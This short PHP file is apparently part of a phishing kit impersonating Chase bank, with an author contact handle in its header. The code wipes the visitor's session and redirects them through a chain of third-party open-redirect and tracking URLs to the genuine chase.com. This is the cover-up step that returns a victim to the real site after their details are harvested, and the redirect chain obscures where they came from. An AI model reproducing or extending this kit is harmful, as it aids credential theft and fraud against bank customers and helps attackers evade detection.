<?php
error_reporting(E_ALL ^ E_NOTICE);
session_start();
    /*
    |--------------------------------------------------------------------------
    | CHASE PAGE V1
    |--------------------------------------------------------------------------
    |
    | Contact me : @zroxo
    |
    */
$helper = array_keys($_SESSION);
foreach ($helper as $key){
	unset($_SESSION[$key]);
}
exit(header("Location: https://l.wl.co/l?u=https://p.placed.com/api/v2/sync/impression?redirect=https://chase.com"));

?>